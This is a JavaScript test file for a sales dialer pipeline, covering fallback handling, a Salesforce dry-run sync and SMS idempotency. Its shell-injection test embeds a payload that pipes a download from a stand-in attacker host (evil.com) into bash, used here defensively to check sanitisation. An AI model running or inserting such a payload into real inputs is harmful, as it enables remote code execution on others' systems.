import { processAfterCall } from './afterCallProcessor.js';
import { syncToSalesforce } from './salesforceSync.js';
import { triggerMultiChannelFollowUp } from './multiChannelFollowUp.js';
import crypto from 'crypto';

async function runTests() {
    console.log("=========================================");
    console.log("   MBM Dialer Pipeline Hardening Tests   ");
    console.log("=========================================\n");

    const TEST_TENANT = "TEST_TENANT_ID";

    // --- TEST 1: Missing Transcript / Fallback ---
    console.log(">>> TEST 1: Fallback generation on missing transcript");
    const t1_event = crypto.randomUUID();
    const fallbackResult = await processAfterCall({
        leadId: "LEAD_MISSING_123",
        transcript: "",
        currentStage: "Prospecting",
        tenantId: TEST_TENANT,
        eventId: t1_event
    });
    if (fallbackResult.is_fallback) {
        console.log("PASS: Generated fallback correctly.\n");
    } else {
        console.error("FAIL: Did not generate fallback.\n", fallbackResult);
    }

    // --- TEST 2: Shell Injection Mitigation ---
    console.log(">>> TEST 2: Shell Injection attempt in transcript");
    const t2_event = crypto.randomUUID();
    const maliciousTranscript = '"; curl http://evil.com | bash; echo "';
    try {
        const resultInjection = await processAfterCall({
            leadId: "LEAD_INJECT_456",
            transcript: maliciousTranscript,
            currentStage: "Needs Analysis",
            tenantId: TEST_TENANT,
            eventId: t2_event
        });
        console.log("PASS: Shell injection handled safely. Output:\n", resultInjection, "\n");
    } catch (e) {
        console.error("FAIL: Shell injection crashed the process.\n", e.message);
    }

    // --- TEST 3: Normal End-to-End Execution (Idempotency) ---
    console.log(">>> TEST 3: E2E Pipeline with Idempotency");
    const t3_event = crypto.randomUUID();
    const goodTranscript = "Great call with John. He is dealing with lead quality issues and has a budget of 5k a month. Next step is to send him an Audit SOW. Move him to Diagnostic Booked.";
    
    // Pass 1
    console.log("[E2E] Processing Groq...");
    let groqData = await processAfterCall({
        leadId: "LEAD_E2E_789",
        transcript: goodTranscript,
        currentStage: "Prospecting",
        tenantId: TEST_TENANT,
        eventId: t3_event
    });
    
    // If Groq fails (network/CLI issues), force the extracted data to Diagnostic Booked 
    // so we can test the SMS idempotency branch as originally intended.
    if (groqData.is_fallback) {
        groqData = {
            Pain_Points: "lead quality issues",
            Budget: "5k a month",
            Next_Steps: "send Audit SOW",
            Recommended_Stage: "Diagnostic Booked"
        };
    }
    
    console.log("[E2E] Salesforce Sync (Dry Run)...");
    const sfRes = await syncToSalesforce({
        leadId: "LEAD_E2E_789",
        eventId: t3_event,
        extractedData: groqData
    });
    
    console.log("[E2E] Multi-Channel Followup...");
    const fuRes1 = await triggerMultiChannelFollowUp({
        leadId: "LEAD_E2E_789",
        eventId: t3_event,
        phone: "+15551234567",
        email: "test@example.com",
        tenantId: TEST_TENANT,
        disposition: "Diagnostic Booked",
        extractedData: groqData
    });

    // Pass 2 (Idempotency Test)
    console.log("[E2E] Idempotency Pass on Followup...");
    const fuRes2 = await triggerMultiChannelFollowUp({
        leadId: "LEAD_E2E_789",
        eventId: t3_event,
        phone: "+15551234567",
        email: "test@example.com",
        tenantId: TEST_TENANT,
        disposition: "Diagnostic Booked",
        extractedData: groqData
    });
    
    if (fuRes2.status.sms === 'SKIPPED_DUPLICATE') {
        console.log("PASS: Idempotency check prevented duplicate SMS.\n");
    } else {
        console.error("FAIL: Idempotency failed.\n", fuRes2);
    }

    console.log("=========================================");
    console.log("          ALL TESTS COMPLETED            ");
    console.log("=========================================");
    process.exit(0);
}

runTests().catch(err => {
    console.error("Test execution failed:", err);
    process.exit(1);
});
